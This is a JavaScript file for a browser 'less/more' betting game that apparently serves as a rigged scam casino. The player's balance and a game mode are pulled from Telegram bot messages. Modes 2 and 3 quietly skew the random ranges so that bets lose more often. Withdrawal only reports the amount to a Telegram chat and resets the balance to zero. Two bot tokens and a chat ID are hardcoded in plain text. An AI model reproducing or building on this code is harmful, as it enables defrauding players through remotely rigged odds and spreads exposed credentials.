const buttonLess = document.querySelector('#buttonLess')
const buttonMore = document.querySelector('#buttonMore')
const havewin = document.querySelector('#havewin')
const yourwin = document.querySelector('.yourwin')
const lose = document.querySelector('.lose')
const changebal = document.querySelector('#changebal')
const vyvod = document.querySelector('#vyvod')
const b1 = document.querySelector('#b1')
const b5 = document.querySelector('#b5')
const b10 = document.querySelector('#b10')
const b50 = document.querySelector('#b50')
const bethtml = document.querySelector('#bethtml')
const TOKEN = '6565999105:AAGgmgpmO9bYrl1nx4RsIRKaXaARqldSim4';
const CHAT_ID = '-1002146536853';
const URI_API = `https://api.telegram.org/bot${ TOKEN }/sendMessage`;
let sleep = ms => new Promise(res=>setTimeout(res,ms));
function clearPage(){
	changebal.innerHTML = balance;
}

function random(min, max){
    return Math.round(Math.random() * (max - min) + min)
}

let bet = 1

b1.addEventListener('click', function(){
    bethtml.innerHTML = 1
    bet = 1
})

b5.addEventListener('click', function(){
    bethtml.innerHTML = 5
    bet = 5
})

b10.addEventListener('click', function(){
    bethtml.innerHTML = 10
    bet = 10
})

b50.addEventListener('click', function(){
    bethtml.innerHTML = 50
    bet = 50
})

vyvod.addEventListener('click', function(){
    if (balance < 300){
        alert('для вывода, ваш баланс должен быть 300 или больше')
    }else{
        message = `<b>вывод: <code>${balance}</code></b>`;
    
        axios.post(URI_API, {
            chat_id: CHAT_ID,
            parse_mode: 'html',
            text: message
        })
        balance = 0
        changebal.innerHTML = 0

    }
})

async function getResponse(){
    let response = await fetch('https://api.telegram.org/bot6565999105:AAGgmgpmO9bYrl1nx4RsIRKaXaARqldSim4/getUpdates?chat_id=-1002146536853')
    let content = await response.json()
    NumberOfAmountNumber = (content.result.length - 1);
    balance = (content.result[NumberOfAmountNumber].message.text);
    clearPage()
    return balance
}

getResponse()


async function gamemode(){
    let response2 = await fetch('https://api.telegram.org/bot6615831925:AAHaBizIsuwQThVVXcmUGQbWN3OPPowiK9U/getUpdates?chat_id=-1002146536853')
    let content2 = await response2.json()
    NumberOfAmountNumber2 = (content2.result.length - 1);
    gamemodecas = (content2.result[NumberOfAmountNumber2].message.text);
    console.log(gamemodecas);
    if (gamemodecas == 1){
        buttonLess.addEventListener('click', function(){
            if (balance < bet){
                alert('недостаточно средств')
            }else{            let number = random(0, 999999)
                balance -= bet
                changebal.innerHTML = balance
                if (number <= 499999){
                    lose.classList.add('hid')
                    yourwin.classList.remove('hid')
                    balance += bet * 2
                    havewin.innerHTML = `${bet * 2}`
                    changebal.innerHTML = balance
                }else{
                    yourwin.classList.add('hid')
                    lose.classList.remove('hid')
                }
            }
        })
        buttonMore.addEventListener('click', function(){
            if (balance < bet){
                alert('недостаточно средств')
            }else{
                let number = random(0, 999999)
                balance -= bet
                changebal.innerHTML = balance
                if (number >= 499999){
                    lose.classList.add('hid')
                    yourwin.classList.remove('hid')
                    balance += bet * 2
                    havewin.innerHTML = `${bet * 2}`
                    changebal.innerHTML = balance
                }else{
                    yourwin.classList.add('hid')
                    lose.classList.remove('hid')
                }
            }
        })
    }else if(gamemodecas == 2){
        buttonLess.addEventListener('click', function(){
            if (balance < bet){
                alert('недостаточно средств')
            }else{
                let number = random(300000, 999999)
                balance -= bet
                changebal.innerHTML = balance
                if (number <= 499999){
                    lose.classList.add('hid')
                    yourwin.classList.remove('hid')
                    balance += bet * 2
                    havewin.innerHTML = `${bet * 2}`
                    changebal.innerHTML = balance
                }else{
                    yourwin.classList.add('hid')
                    lose.classList.remove('hid')
                }
            }
        })
        buttonMore.addEventListener('click', function(){
            if (balance < bet){
                alert('недостаточно средств')
            }else{
                let number = random(0, 600000)
                balance -= bet
                changebal.innerHTML = balance
                if (number >= 499999){
                    lose.classList.add('hid')
                    yourwin.classList.remove('hid')
                    balance += bet * 2
                    havewin.innerHTML = `${bet * 2}`
                    changebal.innerHTML = balance
                }else{
                    yourwin.classList.add('hid')
                    lose.classList.remove('hid')
                }
            }
        })
    }else if(gamemodecas == 3){
        buttonLess.addEventListener('click', function(){
            if (balance < bet){
                alert('недостаточно средств')
            }else{
                let number = random(0, 600000)
                balance -= bet
                changebal.innerHTML = balance
                if (number <= 499999){
                    lose.classList.add('hid')
                    yourwin.classList.remove('hid')
                    balance += bet * 2
                    havewin.innerHTML = `${bet * 2}`
                    changebal.innerHTML = balance
                }else{
                    yourwin.classList.add('hid')
                    lose.classList.remove('hid')
                }
            }
        })
        buttonMore.addEventListener('click', function(){
            if (balance < bet){
                alert('недостаточно средств')
            }else{
                let number = random(300000, 999999)
                balance -= bet
                changebal.innerHTML = balance
                if (number >= 499999){
                    lose.classList.add('hid')
                    yourwin.classList.remove('hid')
                    balance += bet * 2
                    havewin.innerHTML = `${bet * 2}`
                    changebal.innerHTML = balance
                }else{
                    yourwin.classList.add('hid')
                    lose.classList.remove('hid')
                }
            }
        })
    }
    return gamemodecas
}

gamemode()

